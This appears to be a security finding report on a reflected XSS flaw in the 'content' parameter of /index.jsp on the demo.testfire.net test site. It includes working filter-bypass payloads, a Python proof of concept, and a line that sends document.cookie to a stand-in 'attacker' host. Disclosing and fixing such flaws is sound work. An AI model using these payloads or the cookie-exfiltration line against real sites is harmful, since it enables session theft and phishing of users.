# Reflected XSS in GET /index.jsp 'content' parameter (keyword-filter bypass)

**ID:** vuln-0007
**Severity:** MEDIUM
**Found:** 2026-09-20 21:48:10 UTC
**Target:** http://demo.testfire.net
**Endpoint:** /index.jsp
**Method:** GET
**CWE:** CWE-79
**CVSS:** 6.1
**Confidence:** High
**Fix Effort:** Low

## Description

The `content` parameter of `/index.jsp` is reflected into the HTML response inside an error paragraph with no output encoding. A keyword blacklist is applied but can be bypassed with event handlers it does not cover (`ontoggle`, `onstart`), allowing unauthenticated script execution in the application origin.

## Evidence

Request:
```http
GET /index.jsp?content=z%3Cdetails%20open%20ontoggle%3Ddocument.title%3D7%3E HTTP/1.1
Host: demo.testfire.net
```
Response excerpt (payload reflected raw):
```html
<p>Failed due to The requested resource (/static/z<details open ontoggle=document.title=7>) is not available</p>
```
Parsed DOM in a real browser:
```html
<details open="" ontoggle="document.title=7">) is not available<p></p></details>
```
Browser confirmation: after loading the crafted URL the page title became `7`, proving the `ontoggle` handler executed.

Filter-bypass evidence:
```text
content=z<details open ontoggle=M>M</details>  -> REFLECTED (len 6835)
content=z<marquee onstart=M>M</marquee>        -> REFLECTED (len 6829)
content=z<script>M</script>                    -> suppressed (len 6748, empty message)
content=z<img src=x onerror=M>                 -> suppressed
content=z<b onclick=M>M</b>                    -> suppressed
```

## Impact

An unauthenticated attacker can deliver a crafted URL that executes arbitrary JavaScript in the victim's browser within the application origin, enabling session riding on authenticated actions, theft of non-HttpOnly data, and in-origin phishing. Because the filter is a blacklist, it provides no real protection.

## Counterevidence

The application does implement a blacklist filter for `content`, which blocks common vectors such as `<script>`, `onerror`, `onload`, `onclick` and `style`. This is the strongest argument against exploitability, but it is bypassed by handlers it omits (`ontoggle`, `onstart`), demonstrated end-to-end in a browser. There is no CSP or X-XSS-Protection header that would otherwise block inline handlers. The reflected value is placed in element content (not an attribute), so the handlers execute normally.

## What Would Change This Severity

If the blacklist were replaced by strict output encoding or an allow-list such that no handler could be reflected, severity would drop to informational; a demonstrated cross-user impact would raise it.

## Technical Analysis

`/index.jsp` takes a `content` parameter and, when the referenced resource cannot be resolved, writes an error string into the page that contains the raw value of `content`:

```html
<p>Failed due to The requested resource (/static/z<details open ontoggle=document.title=7>) is not available</p>
```

A blacklist filter suppresses some payloads: values containing `script`, `onerror`, `onload`, `onclick`, `onmouseover`, `onfocus`, `autofocus`, `javascript:` or `style` cause the echoed value to be dropped (the message becomes empty and the value is not reflected). However the filter does not cover `ontoggle` or `onstart`, so `<details open ontoggle=...>` and `<marquee onstart=...>` are reflected verbatim and their handlers auto-fire when the markup is parsed, yielding XSS. No CSP or X-XSS-Protection header is returned.

Filter behaviour (observed):
```
content=z<b>M</b>                          -> reflected raw
content=z<details open ontoggle=M>M</details> -> reflected raw
content=z<marquee onstart=M>M</marquee>       -> reflected raw
content=z<script>M</script>               -> suppressed (not reflected)
content=z<img src=x onerror=M>            -> suppressed
content=z<b style=M>M</b>                 -> suppressed
```

## Proof of Concept

1. Craft `http://demo.testfire.net/index.jsp?content=z<details open ontoggle=document.title=7>` (URL-encode the payload).
2. Load the URL in a browser.
3. The `<details open ontoggle=...>` markup is reflected unencoded and the `ontoggle` handler fires on parse, setting `document.title` to `7`.
4. Equivalent auto-firing payload `<marquee onstart=document.title=8>` also works; `<details open ontoggle=fetch('//attacker/'+document.cookie)>` executes in the same origin.

```python
import requests, urllib.parse

base = "http://demo.testfire.net/index.jsp?content="
payload = 'z<details open ontoggle=document.title=7>'
url = base + urllib.parse.quote(payload, safe='')

r = requests.get(url, timeout=15)
print("status:", r.status_code)
# payload reflected raw -> ontoggle fires in the browser
print("reflected:", payload in r.text)
i = r.text.find("Failed due to")
print(r.text[i:i+140])
```

## Remediation

Do not reflect the `content` parameter into the response at all; return a static, generic error page. If reflection is required, HTML-entity-encode the value for the exact context. Replace the keyword blacklist with an allow-list of accepted content names, and add a restrictive `Content-Security-Policy` as defence in depth.

## Assumptions

Assumes a victim visits the crafted link. No authentication is required to reach `/index.jsp`. `ontoggle`/`onstart` auto-fire without user interaction in current Chromium/Firefox.
